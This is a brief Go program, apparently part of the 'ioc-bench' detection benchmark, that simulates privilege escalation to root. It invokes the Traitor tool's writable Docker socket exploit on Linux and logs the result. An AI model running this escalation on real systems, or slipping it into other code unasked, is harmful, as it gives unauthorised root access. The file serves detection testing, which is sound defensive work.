//go:build linux

// Simulates using Docker sockets to escalate user privileges to root
package main

import (
	"log"
	"os/exec"

	"github.com/tstromberg/ioc-bench/pkg/simulate"
)

func main() {
	_, err := exec.LookPath("docker")
	if err != nil {
		log.Printf("unable to find docker: %v", err)
		return
	}

	if err := simulate.Traitor("--exploit", "docker:writable-socket"); err != nil {
		log.Fatalf("exploit failed: %v", err)
	}

	log.Printf("I think we were successful? If so, awesome.")
}
